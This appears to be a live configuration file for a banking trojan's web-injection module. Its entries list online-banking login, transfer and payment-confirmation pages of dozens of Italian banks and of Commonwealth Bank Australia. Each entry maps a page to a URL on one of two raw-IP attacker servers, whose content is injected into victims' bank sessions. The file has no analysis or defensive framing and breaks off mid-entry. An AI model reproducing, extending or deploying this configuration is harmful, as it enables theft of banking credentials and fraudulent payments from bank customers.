<igroup>
<dinj>
<lm>*/rcrd/1547738007155673*</lm>
<hl>https://51.81.113.28:446/response/rcrd.php?s=1547738007155673</hl>
<pri>100</pri>
<sq>2</sq>
</dinj>
<dinj>
<lm>*/iytdr56ygc567ygtyhgyukiu654efgh/*</lm>
<hl>https://51.81.113.28:446/response.php?s=1547738007155673&id=pTCpS2vUujsK8z3zXJ0L</hl>
<pri>100</pri>
<sq>2</sq>
</dinj>
</igroup>
<igroup>
<dinj>
<lm>*/rcrd/1584097681876834*</lm>
<hl>https://51.81.113.28:446/response/rcrd.php?s=1584097681876834</hl>
<pri>100</pri>
<sq>2</sq>
</dinj>
<dinj>
<lm>https://digital.mps.it/pri/login/*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=qVO7FmnWdv3CqlwU53XE</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*icb.mps.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=d4wYKmoNAL4jbXsWnwNP</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*poste.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=O6D4aGfNwIxDT5OfEo9d</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://ibk.nexi.it/ibk/web*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=tN8O8VDbWyHtPRydtWy0</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://ib.cbibanking.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=HMucklYySnPDh9NWPo2h</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://*bancagenerali.it/pib*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=YCZPUzOj6gGO3b0oxZXp</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://ib.mps.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=KTjaFGA6rzAIRhzYpxsn</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*ihb*.cedacri.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=rOE8Tr0FuFXfSSUaDO6M</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://nowbankingcorporate.friuladria.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=uCQHZmGWTLLlfhfR94Wj</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://scrigno.popso.it/*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=eMimeUZPy76ZHmG1apBW</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://qweb.quercia.com/deutschebank*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=nN2EWQAMeD3cg32aDQtJ</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*aziendaonline.mps.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=xhyi95QEt2sH7ZGSl5FV</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*creval.it/bancaperta*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=bpj5AXSdClkWLG84Xv02</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*business.bnl.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=kpmcigmW4tIXJAliL5SP</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*paco.cabel.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=uOggu83wFMsZgJy2gYXR</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://icbp.seceti.it/contrattobpercbi*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=lcasCwk4Qjbk8sBCAE8g</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*core*.cedacri.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=YNsg198eIe2CENiLH2Q6</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*inbank.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=UqKF7TJ4pK6nu55Nq5SR</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://banklinknet2.cariparma.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=PzKFqjTUgsVxfN2OL347</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://nowbanking.credit-agricole.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=hNRuyY0glKhPxpDGkhRh</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://carigeonline.gruppocarige.it/wps*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=Yagk0Foy3wjdzOq6nQcP</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*ubibanca.com*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=Vs9fOJw0UArIH5NRL2Fi</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://cbi.bpergroup.net/ibk/*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=qAfHjNJAMHs8TCAv8VAY</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*fideuramonline.it/script/ServiceLogin/ib/login*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=juhyLxqVBnei6qmSsjZ7</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://*unicredit.it/wps/myportal/retail*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=9kgyvNnUnLXBHKxfhR76</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*icb.mps.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=IqS9Lp3Qs0uILRwyvocO</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://*inbiz.intesasanpaolo.com*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=93vdwyq6sh9oBUrUmnzS</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*youweb.bancobpm.it/WEBHT*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=nZLf5Zn5ckDvobxOozo2</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*mybanking.credem.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=f2hUQzGxBwEot8ExHJ1m</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*finecobank.com*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=LcVEiKUW9394wikl1RmW</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://banklinknet2.carispezia.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=NlWlLA26RToHt8mTsgOI</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*idp-bpiol.poste.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=6350FGwOB6MQS5d7ZcXy</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://corporate.friuladria.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=IJgYwiMilRq9dmvYXx5O</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://nowbankingcorporate.cariparma.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=rtvUCSO49CMSm2QTlDcH</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://*gruppocarige.it/wps*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=8ldKgFEC3ev2pLmqqKYu</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*csebo.it/webcontoc*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=YJZHjkZ5qSUBheGScz5O</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://banking.bnl.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=j3x1pd2ADExKICKojgcV</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://clienti.chebanca.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=1eufomiZKmEvZe8AXaZK</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://ibbweb.tecmarket.it/*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=hhHR67XuY9k7vxRMdwoh</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*www.credem.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=GmZr9Sd6TdL9g237BJFd</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*www.intesasanpaolo.com*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=QKf1HHY4dLUK3t2czTR3</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*banking4you.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=HJb3L1X7FaO9MFRM2xJW</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://*unicredit.it/it/privati.html*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=eVMWyxkROwNbwzrByPGK</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://online-smallbusiness.unicredit.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=oViUuJw2ydNIx3h3QEYd</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*bancopostaimpresaonline.poste.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=SgRoybJA35wuTbDNCEs7</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*banking-imprese.credem.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=MXtg3z4uEXlCKNSMW10E</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*homebanking.bpergroup.net*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=WjL3jrVFwBBnlQp3xn8K</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>*relaxbanking.it*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=gjBKrgh9ZivFEv6OnkVg</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://digital.mps.it/pri/pr/*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=gKmNNEREiPRIKGQp2dmg</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://dbonline.italy.db.com/portalserver/dbiPortal/*</lm>
<hl>https://51.81.113.28:446/response.php?s=1584097681876834&id=7aybmyzTyxjVkmAgca3q</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*text/html*</require_header>
</dinj>
</igroup>
<igroup>
<dinj>
<lm>https://*.my.commbank.com.au/netbank/PaymentHub/MakePayment.aspx*sn-transfers-bpay</lm>
<hl>http://107.175.194.177:2020/hYduOVpZwD</hl>
<pri>100</pri>
<sq>2</sq>
<ignore_mask>*.ico*</ignore_mask>
<require_header>*200 OK*</require_header>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://*.my.commbank.com.au/netbank/Logon/Logon.aspx*</lm>
<hl>http://107.175.194.177:2020/pkoahwb4v8</hl>
<pri>100</pri>
<sq>2</sq>
<ignore_mask>*Embedded*</ignore_mask>
</dinj>
<dinj>
<lm>https://*.my.commbank.com.au/netbank/PaymentHub/ConfirmDetails.aspx*</lm>
<hl>http://107.175.194.177:2020/tcl22y7g409</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*200 OK*</require_header>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://*.my.commbank.com.au/netbank/PaymentHub/PaymentReceipt.aspx*</lm>
<hl>http://107.175.194.177:2020/fko9bleao2</hl>
<pri>100</pri>
<sq>2</sq>
<require_header>*200 OK*</require_header>
<require_header>*text/html*</require_header>
</dinj>
<dinj>
<lm>https://*.commbank.com.au/*hzvvs6mw31*</lm>
<hl>http://107.175.194.177:2020/hzvvs6mw31</